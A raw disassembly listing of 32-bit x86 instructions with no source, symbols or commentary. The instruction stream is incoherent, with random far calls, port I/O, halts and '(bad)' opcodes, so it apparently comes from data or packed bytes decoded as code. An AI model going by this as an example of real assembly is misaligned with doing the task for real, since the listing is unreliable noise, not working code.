  406b30:	mov    al,0x61
  406b32:	adc    DWORD PTR [esi],esi
  406b34:	fbstp  TBYTE PTR [ecx+edx*1-0x4c]
  406b38:	inc    esi
  406b39:	push   edi
  406b3a:	jne    0x406b03
  406b3c:	xor    al,0x4a
  406b3e:	add    BYTE PTR [eax-0x4cd56b29],dl
  406b44:	sub    DWORD PTR [ebx+0x3d071b33],ebp
  406b4a:	mov    al,0x4d
  406b4c:	out    dx,eax
  406b4d:	sbb    DWORD PTR [bp+di],ecx
  406b50:	test   al,0x25
  406b52:	pop    eax
  406b53:	test   eax,0xfde157d2
  406b58:	push   edi
  406b59:	xor    esp,edi
  406b5b:	dec    ebx
  406b5c:	icebp  
  406b5d:	or     bh,dh
  406b5f:	call   0x3f70:0xabd85121
  406b66:	add    DWORD PTR [eax-0x47],esi
  406b69:	jmp    0x406b89
  406b6b:	gs xchg edi,eax
  406b6d:	clc    
  406b6e:	push   edx
  406b6f:	int3   
  406b70:	test   eax,0x5b8c9e40
  406b75:	jne    0x406bf6
  406b77:	mov    eax,ds:0xe5ab2eb9
  406b7c:	push   cs
  406b7d:	or     al,0xf1
  406b7f:	xor    al,0x87
  406b81:	dec    esi
  406b82:	fstp   TBYTE PTR [edi-0x56db6b83]
  406b88:	mov    WORD PTR [ebx+0x58],ds
  406b8b:	ror    DWORD PTR [esi],0xc7
  406b8e:	dec    ebp
  406b8f:	mov    BYTE PTR [edi],ch
  406b91:	enter  0x8f6b,0xb2
  406b95:	(bad)  
  406b97:	cmp    esp,DWORD PTR [edx]
  406b99:	hlt    
  406b9a:	pop    ds
  406b9b:	in     eax,dx
  406b9c:	pop    ds
  406b9d:	push   DWORD PTR [ecx-0x67]
  406ba0:	push   ecx
  406ba1:	mov    esp,0xd6ea137
  406ba6:	inc    esi
  406ba7:	daa    
  406ba8:	and    al,0x3e
  406baa:	jmp    0x1ab4d803
  406baf:	jns    0x406b7a
  406bb1:	frstpm(287 only) 
  406bb3:	adc    dh,ah
  406bb5:	call   0xe51f:0x950d5c55
  406bbc:	retf   
  406bbd:	ret    0x7043
  406bc0:	stc    
  406bc1:	push   ss
  406bc2:	pop    ds
  406bc3:	push   eax
  406bc4:	call   0xc5abf83e
  406bc9:	sbb    dl,dh
  406bcb:	retf   
  406bcc:	jg     0x406b9a
  406bce:	or     DWORD PTR [edx+0x1e],0x242c4868
  406bd5:	mov    ebx,0x532ee4cc
  406bda:	ins    DWORD PTR es:[edi],dx
  406bdb:	add    eax,0x4fd387d1
  406be0:	pop    eax
  406be1:	ud2    
  406be3:	(bad)  
  406be4:	jno    0x406b80
  406be6:	ror    cl,0x74
  406be9:	add    DWORD PTR [edi-0x2e58c80d],edi
  406bef:	(bad)  
  406bf0:	fiadd  WORD PTR [esi+0x3c89346d]
  406bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406bf7:	push   edi
  406bf8:	addr16 pushf 
  406bfa:	dec    eax
  406bfb:	push   ecx
  406bfc:	inc    ecx
  406bfd:	and    al,0xf6
  406bff:	mov    ecx,0x464c317d
  406c04:	mov    ch,0xf8
  406c06:	pop    eax
  406c07:	jmp    0xf7b2d9d2
  406c0c:	jae    0x406c7c
  406c0e:	xchg   ebx,eax
  406c0f:	les    ecx,FWORD PTR [edx-0x15f03f84]
  406c15:	push   ds
  406c16:	push   cs
  406c17:	fld    QWORD PTR [eax-0x410cfdf]
  406c1d:	iret   
  406c1e:	out    dx,al
  406c1f:	out    0xc5,eax
  406c21:	mov    esi,0xc9ebb111
  406c26:	lock call 0x1d6a:0xb91da06f
  406c2e:	xor    DWORD PTR [edx-0x27bde3e5],0xffffffe6
  406c35:	push   edi
  406c36:	dec    ecx
  406c37:	fstp   TBYTE PTR [esi-0x5d]
  406c3a:	scas   eax,DWORD PTR es:[edi]
  406c3b:	test   DWORD PTR [ebx-0x28],0xd4a7bf38
  406c42:	push   ebx
  406c43:	hlt    
  406c44:	cmc    
  406c45:	call   0x1a9b:0x91d0ce11
  406c4c:	add    eax,0xecda0f69
  406c51:	test   eax,0x4cadf49b
  406c56:	fs sub eax,0xa69c9db9
  406c5c:	fwait
  406c5d:	mov    dh,0x7b
  406c5f:	sub    ch,BYTE PTR gs:[eax-0x2a5086b8]
  406c66:	and    edi,edi
  406c68:	and    esp,edx
  406c6a:	xor    eax,0xdd8b47
  406c6f:	mov    ch,0x65
  406c71:	out    dx,al
  406c72:	std    
  406c73:	mov    ebp,0x6e6a6975
  406c78:	push   0xffffff9e
  406c7a:	push   cs
  406c7b:	jno    0x406ca4
  406c7d:	xor    dl,bh
  406c7f:	mov    esp,0x9b0b0584
  406c84:	push   edi
  406c85:	push   eax
  406c86:	addr16 loopne 0x406cb1
  406c89:	or     ch,BYTE PTR [eax]
  406c8b:	retf   0xcc60
  406c8e:	pusha  
  406c8f:	test   ecx,esi
  406c91:	jb     0x406c1a
  406c93:	inc    edx
  406c94:	in     al,dx
  406c95:	inc    esp
  406c96:	add    BYTE PTR [ecx-0x31f6edd2],cl
  406c9c:	adc    ebx,ebp
  406c9e:	aam    0xee
  406ca0:	jmp    FWORD PTR [ebx+0x15df440]
  406ca6:	(bad)  
  406ca7:	dec    ebp
  406ca8:	dec    edi
  406ca9:	or     BYTE PTR [edx+0x6ae9df24],bl
  406caf:	push   ebx
  406cb0:	push   es
  406cb1:	loop   0x406cb1
  406cb3:	inc    edi
  406cb4:	mov    eax,ds:0x6079865f
  406cb9:	mov    eax,ds:0xddb341fc
  406cbe:	fwait
  406cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cc0:	mov    edx,0x8fd1ca75
  406cc5:	fwait
  406cc6:	dec    ecx
  406cc7:	inc    edi
  406cc8:	xchg   al,cl
  406cca:	pop    ecx
  406ccb:	pushw  ds
  406ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cce:	cmp    DWORD PTR ds:0x12f62bb8,eax
  406cd4:	hlt    
  406cd5:	and    BYTE PTR [ebp+0x41d1ed0e],ch
  406cdb:	sbb    al,BYTE PTR [edi-0x1]
  406cde:	sbb    DWORD PTR [edi+ebx*4],0x74a5810a
  406ce5:	popw   ds
  406ce7:	cwde   
  406ce8:	mov    ds:0x127e8cd9,eax
  406ced:	fptan  
  406cef:	and    al,BYTE PTR [edi]
  406cf1:	jns    0x406cc9
  406cf3:	rol    BYTE PTR [ecx-0x39],cl
  406cf6:	inc    ebp
  406cf7:	out    dx,eax
  406cf8:	xchg   edx,ebp
  406cfa:	adc    eax,edx
  406cfc:	adc    al,0x9c
  406cfe:	or     BYTE PTR [edx],al
  406d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d01:	rcl    ch,0x9f
  406d04:	out    dx,eax
  406d05:	stos   DWORD PTR es:[edi],eax
  406d06:	sti    
  406d07:	imul   edi,DWORD PTR [eax],0x55790a48
  406d0d:	lahf   
  406d0e:	in     eax,dx
  406d0f:	in     eax,dx
  406d10:	call   0x65f8:0xf761fe92
  406d17:	lods   al,BYTE PTR ds:[esi]
  406d18:	pop    es
  406d19:	ja     0x406d70
  406d1b:	mov    edx,esi
  406d1d:	push   es
  406d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d1f:	mov    gs,esi
  406d21:	in     al,0x47
  406d23:	jnp    0x406d86
  406d25:	(bad)  
  406d26:	push   ebx
  406d27:	ja     0x406da0
  406d29:	scas   al,BYTE PTR es:[edi]
  406d2a:	lods   eax,DWORD PTR ds:[esi]
  406d2b:	dec    edi
  406d2c:	fcom   QWORD PTR [ebx-0x620c963f]
  406d32:	xor    ecx,edi
  406d34:	cs jmp 0xd399ed31
  406d3a:	ss lahf 
  406d3c:	les    edx,FWORD PTR [esi-0x5d06da39]
  406d42:	or     al,0x47
  406d44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d45:	mov    cl,0x16
  406d47:	loopne 0x406ce4
  406d49:	adc    ebx,DWORD PTR [ecx-0x55023832]
  406d4f:	sub    al,0x87
  406d51:	mov    bh,0x4e
  406d53:	or     eax,DWORD PTR [ebp-0x45]
  406d56:	sbb    bl,BYTE PTR [ebx+0x77]
  406d59:	stc    
  406d5a:	jg     0x406d17
  406d5c:	adc    DWORD PTR [ebx+0x31a8e24c],ecx
  406d62:	sbb    BYTE PTR [eax],bh
  406d64:	sbb    eax,0xaeaad19f
  406d69:	xchg   ebp,eax
  406d6a:	shl    DWORD PTR fs:[ebx-0x2a],1
  406d6e:	mov    bl,0xc0
  406d70:	clc    
  406d71:	lock sahf 
  406d73:	push   0x3e
  406d75:	call   0xbb7aa920
  406d7a:	cmp    DWORD PTR [eax+0x32cd6cd2],eax
  406d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d81:	dec    ebx
  406d82:	jo     0x406dfc
  406d84:	lods   eax,DWORD PTR ds:[esi]
  406d85:	add    eax,esp
  406d87:	xor    eax,0x549b99ae
  406d8c:	xor    al,0x8f
  406d8e:	ret    0xbdea
  406d91:	daa    
  406d92:	fstp   DWORD PTR [eax+eiz*8]
  406d95:	xchg   ecx,eax
  406d96:	and    al,0xed
  406d98:	std    
  406d99:	stc    
  406d9a:	cmc    
  406d9b:	outs   dx,DWORD PTR ds:[esi]
  406d9c:	sub    ebp,ecx
  406d9e:	ja     0x406dd6
  406da0:	ret    
  406da1:	fbstp  TBYTE PTR [edx-0x301ba1b7]
  406da7:	jne    0x406e20
  406da9:	cwde   
  406daa:	nop
  406dab:	ss js  0x406d5b
  406dae:	sahf   
  406daf:	lods   eax,DWORD PTR ds:[esi]
  406db0:	jno    0x406dcc
  406db2:	iret   
  406db3:	(bad)  
  406db5:	cmp    bl,ch
  406db7:	mov    dh,0xb4
  406db9:	jl     0x406d7e
  406dbb:	xchg   edx,eax
  406dbc:	and    edx,DWORD PTR [ebp-0x1b]
  406dbf:	ret    
  406dc0:	jmp    FWORD PTR ds:0xdf5850ac
  406dc6:	and    BYTE PTR [eax],dh
  406dc8:	lods   al,BYTE PTR ds:[esi]
  406dc9:	cld    
  406dca:	pop    ebp
  406dcb:	adc    DWORD PTR [ebp+0x3e92c7b0],ecx
  406dd1:	mov    dh,0x65
  406dd3:	mov    esp,0x2df9b823
  406dd8:	pop    eax
  406dd9:	adc    DWORD PTR ds:0x3eaac68,edi
  406ddf:	or     DWORD PTR [eax-0x8b7d161],edi
  406de5:	fimul  DWORD PTR [ecx+0x47]
  406de8:	int3   
  406de9:	jno    0x406e64
  406deb:	std    
  406dec:	xlat   BYTE PTR ds:[ebx]
  406ded:	lahf   
  406dee:	bound  ecx,QWORD PTR [bx+0x35bc]
  406df3:	test   al,0x2e
  406df5:	fwait
  406df6:	push   ds
  406df7:	mov    ds:0x2a2e5c67,al
  406dfc:	push   eax
  406dfd:	xchg   DWORD PTR [ecx+0x778936eb],ebp
  406e03:	call   0x747780d5
  406e08:	cmp    dh,dh
  406e0a:	jl     0x406e3d
  406e0c:	repnz nop
  406e0e:	fst    QWORD PTR [eax-0x30]
  406e11:	push   esp
  406e12:	mov    ebp,0x11de9c0e
  406e17:	shl    BYTE PTR [ebx],1
  406e19:	sbb    ch,bh
  406e1b:	out    0x32,eax
  406e1d:	xor    eax,0x61896198
  406e22:	cli    
  406e23:	or     eax,esp
  406e25:	xchg   edi,eax
  406e26:	mov    edi,0x8a54bc65
  406e2b:	shr    BYTE PTR [ebp+0x1e600bb7],0xe3
  406e32:	cmp    bh,dl
  406e34:	push   edi
  406e35:	push   es
  406e36:	pop    ebp
  406e37:	pop    edx
  406e38:	retf   0x78dc
  406e3b:	add    eax,0xf98e9cca
  406e40:	mov    esp,0xadd362ab
  406e45:	sbb    DWORD PTR [esp+edx*8],ebp
  406e48:	fcom   QWORD PTR [ebp-0x77]
  406e4b:	cdq    
  406e4c:	jmp    0x406e67
  406e4e:	mov    ?,WORD PTR [ecx-0x21]
  406e51:	sbb    edi,eax
  406e53:	xor    ebp,DWORD PTR [edi-0x7d]
  406e56:	push   esi
  406e57:	sub    eax,0xd9fd4e84
  406e5c:	cmp    esi,DWORD PTR [ebp-0x30]
  406e5f:	in     al,dx
  406e60:	jg     0x406deb
  406e62:	dec    ecx
  406e63:	jo     0x406e31
  406e65:	xor    BYTE PTR [ecx-0x4],cl
  406e68:	popa   
  406e69:	pop    edx
  406e6a:	sbb    eax,DWORD PTR [esp+ebp*1]
  406e6d:	loop   0x406ecd
  406e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e70:	aas    
  406e71:	ret    0x2a0a
  406e74:	cmp    eax,0xfc8c1eb7
  406e79:	sub    DWORD PTR [eax+0x5f298401],0xfffffff0
  406e80:	push   ebp
  406e81:	jmp    0x9085f25b
  406e86:	div    BYTE PTR gs:[ebx]
  406e89:	aas    
  406e8a:	out    dx,al
  406e8b:	lea    esp,[edx-0x737cf7c6]
  406e91:	inc    edx
  406e92:	mov    dl,0x6
  406e94:	inc    eax
  406e95:	jbe    0x406e4e
  406e97:	dec    ebp
  406e98:	fxch   st(3)
  406e9a:	in     al,0xc6
  406e9c:	ret    0x8502
  406e9f:	cli    
  406ea0:	(bad)  
  406ea1:	adc    BYTE PTR ds:0xce3e3eb1,al
  406ea7:	dec    ebx
  406ea8:	jmp    0x91b5:0x4fc53d88
  406eaf:	cmp    bh,BYTE PTR [ebp-0x29]
  406eb2:	push   ss
  406eb3:	out    0x1,eax
  406eb5:	adc    eax,0x8d084953
  406eba:	mov    ch,0x73
  406ebc:	(bad)  
  406ebd:	sbb    BYTE PTR [esi-0x8bfc46b],al
  406ec3:	xor    al,0x67
  406ec5:	mov    dh,0x9
  406ec7:	inc    eax
  406ec8:	das    
  406ec9:	xor    al,0x59
  406ecb:	jae    0x406f4b
  406ecd:	and    DWORD PTR [esi+0x28a76c1b],edx
  406ed3:	(bad)  
  406ed4:	mov    edi,0x85577d98
  406ed9:	cmp    eax,0xaa77e870
  406ede:	loope  0x406ef6
  406ee0:	fsub   QWORD PTR [esp+eax*4-0x847aad5]
  406ee7:	add    al,0x62
  406ee9:	call   0x9a7149b1
  406eee:	mov    edx,DWORD PTR [ecx]
  406ef0:	push   ds
  406ef1:	sbb    ecx,DWORD PTR [ebx+0x1a852abd]
  406ef7:	sahf   
  406ef8:	lock push ebx
  406efa:	xchg   esp,eax
  406efb:	mov    esi,0xfea141af
  406f00:	aam    0x20
  406f02:	sbb    al,bh
  406f04:	into   
  406f05:	sub    dh,BYTE PTR [edi-0x57b7f5b9]
  406f0b:	inc    esi
  406f0c:	mul    DWORD PTR [edi+0x6cf1dc19]
  406f12:	add    DWORD PTR [ecx-0x10],0xe1bb0f48
  406f19:	pop    ds
  406f1a:	jns    0x406ecb
  406f1c:	push   ds
  406f1d:	daa    
  406f1e:	inc    esi
  406f1f:	and    dh,BYTE PTR [eax-0x57]
  406f22:	cmp    al,BYTE PTR [ebx]
  406f24:	div    BYTE PTR [eax]
  406f26:	mov    ebx,DWORD PTR [edi+0x3]
  406f29:	icebp  
  406f2a:	push   ecx
  406f2b:	mov    edx,0x879310d6
  406f30:	mov    al,ds:0xdee044ca
  406f35:	dec    eax
  406f36:	xlat   BYTE PTR ds:[ebx]
  406f37:	inc    eax
  406f38:	xchg   edi,eax
  406f39:	sbb    al,0xc1
  406f3b:	xlat   BYTE PTR ds:[ebx]
  406f3c:	mov    edx,esp
  406f3e:	mov    al,0x63
  406f40:	cwde   
  406f41:	jae    0x406fa2
  406f43:	cli    
  406f44:	mov    BYTE PTR [esi-0x4a329c08],al
  406f4a:	xchg   BYTE PTR [eax+ebp*1],dh
  406f4d:	lds    ecx,FWORD PTR [ebp+0x60bd1bd1]
  406f53:	jb     0x406f68
  406f55:	sub    ebx,ecx
  406f57:	ror    DWORD PTR [edi],cl
  406f59:	retf   
  406f5a:	adc    dl,BYTE PTR [esp+ebp*1-0x49]
  406f5e:	(bad)  
  406f5f:	fst    QWORD PTR [edi]
  406f61:	je     0x406fbe
  406f63:	sbb    DWORD PTR [ecx-0x2eadb69e],esp
  406f69:	test   al,0x78
  406f6b:	data16 jne 0x406eee
  406f6e:	pop    edx
  406f6f:	cli    
  406f70:	ins    DWORD PTR es:[edi],dx
  406f71:	sub    eax,0xafc9bd3e
  406f76:	and    esp,DWORD PTR [ecx+0x15]
  406f79:	fwait
  406f7a:	dec    ebx
  406f7b:	dec    ebx
  406f7c:	fild   WORD PTR [ecx-0x740efac0]
  406f82:	fwait
  406f83:	retf   
  406f84:	push   ebp
  406f85:	pop    esp
  406f86:	inc    edx
  406f87:	ficomp WORD PTR [ebp+0xb]
  406f8a:	mov    bh,0xcb
  406f8c:	adc    al,0x1a
  406f8e:	jg     0x406ffd
  406f90:	(bad)  
  406f91:	pop    eax
  406f92:	les    edx,FWORD PTR [ecx+0x4f]
  406f95:	mov    cl,0x5
  406f97:	mov    BYTE PTR [esi],bl
  406f99:	cdq    
  406f9a:	and    BYTE PTR [eax-0x75e1dd2b],dl
  406fa0:	aam    0xf7
  406fa2:	add    DWORD PTR [esi],edx
  406fa4:	jnp    0x406ffd
  406fa6:	pop    eax
  406fa7:	les    ecx,FWORD PTR [eax]
  406fa9:	fucomp st(0)
  406fab:	xchg   esp,eax
  406fac:	jge    0x407004
  406fae:	outs   dx,DWORD PTR ds:[esi]
  406faf:	fdiv   QWORD PTR [ebp-0x2de979ab]
  406fb5:	add    esi,DWORD PTR [ecx+edi*2+0x1a]
  406fb9:	jp     0x406f69
  406fbb:	mov    eax,0xafcc8494
  406fc0:	mov    bl,0xd7
  406fc2:	xchg   edi,eax
  406fc3:	retf   
  406fc4:	inc    edi
  406fc5:	test   DWORD PTR [eax],0x3d9b0fe2
  406fcb:	out    0xff,eax
  406fcd:	jl     0x406f8e
  406fcf:	repnz xchg edx,eax
  406fd1:	sbb    dl,BYTE PTR [esi]
  406fd3:	(bad)  
  406fd4:	clc    
  406fd5:	jo     0x407055
  406fd7:	jne    0x407054
  406fd9:	add    ecx,DWORD PTR [edi]
  406fdb:	sbb    DWORD PTR ds:0x9079912e,ebx
  406fe1:	ss xor esp,edx
  406fe4:	or     BYTE PTR [ebp+0x2f1725dd],0x6d
  406feb:	retf   0x145c
  406fee:	push   ebp
  406fef:	add    eax,0xd8a9a46
  406ff4:	xchg   ebp,eax
  406ff5:	test   al,0x4d
  406ff7:	jae    0x406fd8
  406ff9:	or     eax,0x6462df14
  406ffe:	and    ah,bh
  407000:	scas   eax,DWORD PTR es:[edi]
  407001:	xlat   BYTE PTR ds:[ebx]
  407002:	scas   eax,DWORD PTR es:[edi]
  407003:	or     dh,BYTE PTR [ecx-0x67]
  407006:	jnp    0x406f8a
  407008:	(bad)
  40700c:	jg     0x406fee
  40700e:	and    al,0xa3
  407010:	dec    esp
  407011:	mov    al,ds:0x949625a2
  407016:	mov    edi,0xd5f7a742
  40701b:	sti    
  40701c:	fild   DWORD PTR [edi]
  40701e:	sti    
  40701f:	or     eax,0xae1c2719
  407024:	scas   eax,DWORD PTR es:[edi]
  407025:	mov    gs,WORD PTR [esi+0x5a]
  407028:	mov    ds:0xcd1bdb7e,eax
  40702d:	jbe    0x406fc0
  40702f:	rcr    BYTE PTR [ebx+0x7759a47e],0x9a
  407036:	fwait
  407037:	outs   dx,DWORD PTR ds:[esi]
  407038:	sub    ebx,ebx
  40703a:	es dec ecx
  40703c:	push   esp
  40703d:	pop    ecx
  40703e:	adc    DWORD PTR [esi+0x7111ef82],eax
  407044:	inc    edi
  407045:	(bad)  
  407046:	call   0x5fa8:0x71fc9563
  40704d:	and    al,0xc3
  40704f:	cmc    
  407050:	outs   dx,DWORD PTR ds:[esi]
  407051:	xchg   ecx,eax
  407052:	and    al,0xaf
  407054:	(bad)  
  407056:	lea    ecx,[edx+0x6d9764c9]
  40705c:	mov    eax,DWORD PTR [edi-0xa]
  40705f:	addr16 rcl edi,cl
  407062:	cwde   
  407063:	psubsw mm4,QWORD PTR [esi-0x54290415]
  40706a:	pop    ss
  40706b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40706c:	adc    bh,BYTE PTR [esi+ebp*1+0x36]
  407070:	push   edi
  407071:	sbb    ah,dh
  407073:	cmc    
  407074:	scas   eax,DWORD PTR es:[edi]
  407075:	out    dx,al
  407076:	std    
  407077:	cdq    
  407078:	aam    0x40
  40707a:	mov    eax,ds:0xe697249b
  40707f:	inc    edi
  407080:	jmp    0xcf62165e
  407085:	addr16 loopne 0x4070fa
  407088:	mov    al,ds:0x7a68fee0
  40708d:	push   es
  40708e:	rol    BYTE PTR [edi],1
  407090:	jno    0x4070a5
  407092:	mov    eax,ds:0xa071b7c0
  407097:	add    DWORD PTR [ebp+0x576fcb84],eax
  40709d:	dec    eax
  40709e:	les    esi,FWORD PTR [edi+esi*1+0xb125bd0]
  4070a5:	aas    
  4070a6:	dec    esp
  4070a7:	js     0x4070ca
  4070a9:	pop    ecx
  4070aa:	imul   ebx,DWORD PTR [ebx+0x42],0x3e
  4070ae:	call   0xa4c5497
  4070b3:	pop    esi
  4070b4:	mov    esi,0x853467e6
  4070b9:	paddusb mm5,mm3
  4070bc:	push   cs
  4070bd:	dec    esp
  4070be:	clc    
  4070bf:	inc    ecx
  4070c0:	enter  0x8eee,0x4d
  4070c4:	imul   ebp,DWORD PTR [edi],0xb90bdb81
  4070ca:	jmp    0x5d47:0xfc02d519
  4070d1:	mov    ?,WORD PTR [edx+0x41]
  4070d4:	(bad)  
  4070d5:	mov    dh,0x16
  4070d7:	hlt    
  4070d8:	scas   al,BYTE PTR es:[edi]
  4070d9:	sti    
  4070da:	jmp    0x4070ad
  4070dc:	inc    edi
  4070dd:	adc    edx,ebx
  4070df:	jecxz  0x4070aa
  4070e1:	(bad)  
  4070e3:	ja     0x407106
  4070e5:	lods   al,BYTE PTR cs:[esi]
  4070e7:	mov    ch,0x21
  4070e9:	aad    0x80
  4070eb:	cs dec edx
  4070ed:	cmp    al,0xd1
  4070ef:	fild   QWORD PTR ds:0x31c6867a
  4070f5:	xchg   ebx,eax
  4070f6:	out    0xd9,eax
  4070f8:	std    
  4070f9:	sar    BYTE PTR [esi-0x68],cl
  4070fc:	mov    bl,0xab
  4070fe:	sub    BYTE PTR fs:[edi+eiz*2],dh
  407102:	(bad)  
  407103:	sub    al,0xc9
  407105:	shr    ebx,0x9
  407108:	mov    edx,0x7cd41709
  40710d:	dec    BYTE PTR [eax-0x14]
  407110:	push   ecx
  407112:	iret   
  407113:	dec    esp
  407114:	lock lods al,BYTE PTR ds:[esi]
  407116:	std    
  407117:	xchg   DWORD PTR fs:[esi],esi
  40711a:	pusha  
  40711b:	lods   al,BYTE PTR ds:[esi]
  40711c:	int3   
  40711d:	(bad)  
  40711e:	push   ds
  40711f:	ins    BYTE PTR es:[edi],dx
  407120:	or     dh,BYTE PTR [ebx-0x7e66aca0]
  407126:	mov    bl,BYTE PTR [ecx]
  407128:	leave  
  407129:	xchg   ecx,eax
  40712a:	daa    
  40712b:	jge    0x407100
  40712d:	les    eax,FWORD PTR [ecx]
  40712f:	popa   
  407130:	mov    al,ds:0x8ff8e05a
  407135:	ins    BYTE PTR es:[edi],dx
  407136:	push   esi
  407137:	push   es
  407138:	popa   
  407139:	pop    edi
  40713a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40713b:	jp     0x40710a
  40713d:	and    DWORD PTR [ecx-0x11b1b1b3],edx
  407143:	push   ecx
  407144:	outs   dx,BYTE PTR ds:[esi]
  407145:	add    al,0x26
  407147:	jb     0x407177
  407149:	pop    edi
  40714a:	push   eax
  40714b:	inc    esp
  40714c:	xchg   esi,eax
  40714d:	das    
  40714e:	and    eax,esi
  407150:	mov    al,0xa4
  407152:	inc    esp
  407153:	inc    edi
  407154:	mov    ebp,0x875bf508
  407159:	call   0xf5f7:0x22f06b98
  407160:	xor    eax,0x892fe538
  407165:	call   0x192a:0xd28b1a33
  40716c:	xor    esi,ebx
  40716e:	push   edi
  40716f:	mov    ds:0x813b04df,al
  407174:	push   ebx
  407175:	mov    edi,0xefb5014f
  40717a:	ret    0x4c92
  40717d:	mov    bl,0x6c
  40717f:	cmp    eax,0x6246d90b
  407184:	push   edi
  407185:	imul   ecx,DWORD PTR [edi+edi*2+0x541a8f2],0xffffffd9
  40718d:	scas   eax,DWORD PTR es:[edi]
  40718e:	pusha  
  40718f:	jb     0x4071e8
  407191:	dec    ebp
  407192:	repnz test ebx,ecx
  407195:	sbb    al,0xe0
  407197:	adc    al,0xc3
  407199:	cmp    edi,eax
  40719b:	push   edx
  40719c:	dec    ecx
  40719d:	and    eax,0x278096a6
  4071a2:	dec    esp
  4071a3:	xchg   ebp,eax
  4071a4:	pop    ebx
  4071a5:	mov    ch,0x7a
  4071a7:	gs fcom st(6)
  4071aa:	repz and eax,0x9f5d0ee3
  4071b0:	pop    esp
  4071b1:	loop   0x4071e2
  4071b3:	or     ah,BYTE PTR [esi]
  4071b5:	sub    eax,0xd7c3caff
  4071ba:	jno    0x40714e
  4071bc:	aam    0xf1
  4071be:	js     0x4071bc
  4071c0:	(bad)  
  4071c1:	(bad)  
  4071c2:	jne    0x4071f5
  4071c4:	dec    ebx
  4071c5:	mov    ds:0x99b24360,al
  4071ca:	call   0xee19ece5
  4071cf:	dec    ebp
  4071d0:	les    edx,FWORD PTR [eax+0x39]
  4071d3:	rol    BYTE PTR [ecx-0x5d],0x6f
  4071d7:	arpl   WORD PTR [eax],sp
  4071d9:	aaa    
  4071da:	scas   al,BYTE PTR es:[edi]
  4071db:	mov    eax,ds:0xc3582b69
  4071e0:	iret   
  4071e1:	in     al,dx
  4071e2:	mov    bl,0xcb
  4071e4:	pop    ebp
  4071e5:	rcl    BYTE PTR [ecx+eax*8-0x78],1
  4071e9:	je     0x407198
  4071eb:	sub    BYTE PTR ds:[ebx+eiz*4-0xe6f991d],0xbe
  4071f4:	test   BYTE PTR [edx+0x3448ddf9],al
  4071fa:	imul   edi,esp,0x18896204
  407200:	out    0x38,eax
  407202:	sbb    al,0xe8
  407204:	fdiv   st(2),st
  407206:	inc    ebp
  407207:	inc    esp
  407208:	int3   
  407209:	in     eax,dx
  40720a:	fs mov ebp,0xcd8028e2
  407210:	dec    eax
  407211:	nop
  407212:	push   edi
  407213:	adc    BYTE PTR [edi],cl
  407215:	es clc 
  407217:	std    
  407218:	xchg   ebx,eax
  407219:	pop    ebx
  40721a:	(bad)  
  40721b:	out    0x64,al
  40721d:	scas   al,BYTE PTR es:[edi]
  40721e:	data16 int 0xeb
  407221:	xchg   ecx,eax
  407222:	mov    ebp,0xd84bbf97
  407227:	arpl   WORD PTR [ebx+0x192947a0],bp
  40722d:	es push edi
  40722f:	cmp    eax,ebx
  407231:	outs   dx,BYTE PTR ds:[esi]
  407232:	sahf   
  407233:	das    
  407234:	xchg   edx,eax
  407235:	xlat   BYTE PTR ds:[ebx]
  407236:	shl    DWORD PTR [edi-0x15ae327d],0x97
  40723d:	jno    0x407267
  40723f:	int3   
  407240:	xchg   ecx,eax
  407241:	adc    bl,BYTE PTR [edi+esi*8-0x11]
  407245:	daa    
  407246:	retf   
  407247:	stc    
  407248:	or     eax,0x218b66da
  40724d:	mov    ds:0x1d684060,eax
  407252:	pop    esp
  407253:	lahf   
  407254:	fcomp  QWORD PTR [ebx]
  407256:	aas    
  407257:	adc    al,bl
  407259:	xchg   esp,eax
  40725a:	test   BYTE PTR [ebx+0x49],dl
  40725d:	std    
  40725e:	push   ebx
  40725f:	or     esi,ebx
  407261:	mov    al,ds:0x4754ec5b
  407266:	mov    ds:0x59f1aab8,al
  40726b:	enter  0x8ff7,0x9c
  40726f:	xchg   esp,eax
  407270:	arpl   WORD PTR [edx],si
  407272:	ret    0xfbbb
  407275:	test   al,0x25
  407277:	push   es
  407278:	loop   0x40725d
  40727a:	push   ebx
  40727b:	fidiv  WORD PTR [ecx]
  40727d:	mov    dh,0xb0
  40727f:	xchg   DWORD PTR [ecx-0x53],ebp
  407282:	mov    ebp,0xb0dd3675
  407287:	mov    bh,0xe4
  407289:	in     al,0x75
  40728b:	jle    0x407285
  40728d:	fs mov ch,0xb4
  407290:	(bad)  
  407291:	stos   DWORD PTR es:[edi],eax
  407292:	scas   eax,DWORD PTR es:[edi]
  407293:	push   esp
  407294:	test   DWORD PTR [edi-0x2b],esp
  407297:	pop    esp
  407298:	mov    ds:0x4de848db,eax
  40729d:	pop    ebp
  40729e:	icebp  
  40729f:	pop    eax
  4072a0:	cmp    ebp,DWORD PTR [edi+0x2c]
  4072a3:	mov    eax,0x86b34c1c
  4072a8:	pop    edi
  4072a9:	sahf   
  4072aa:	retf   0x4b1e
  4072ad:	aaa    
  4072ae:	mov    dl,0x30
  4072b0:	rcl    al,cl
  4072b2:	aad    0x16
  4072b4:	fidiv  WORD PTR [ebx+0x2a042c1e]
  4072ba:	inc    ecx
  4072bb:	xor    al,0x2e
  4072bd:	pushf  
  4072be:	ja     0x407335
  4072c0:	out    dx,eax
  4072c1:	je     0x407317
  4072c3:	sub    bl,dl
  4072c5:	dec    ebx
  4072c6:	adc    DWORD PTR [ecx+0x2],eax
  4072c9:	pushf  
  4072ca:	mov    esi,0xe82a395
  4072cf:	and    esp,esi
  4072d1:	jmp    0x407293
  4072d3:	xchg   esp,eax
  4072d4:	sub    DWORD PTR [edx+0x5161d997],ebp
  4072da:	out    0xa4,al
  4072dc:	jge    0x40727c
  4072de:	aam    0xf2
  4072e0:	loop   0x4072dd
  4072e2:	aam    0xf0
  4072e4:	out    dx,al
  4072e5:	in     al,dx
  4072e6:	into   
  4072e7:	bound  edi,QWORD PTR [edi]
  4072e9:	popf   
  4072ea:	idiv   dh
  4072ec:	retf   0xc59d
  4072ef:	and    eax,DWORD PTR [eax-0x34]
  4072f2:	fs retf 
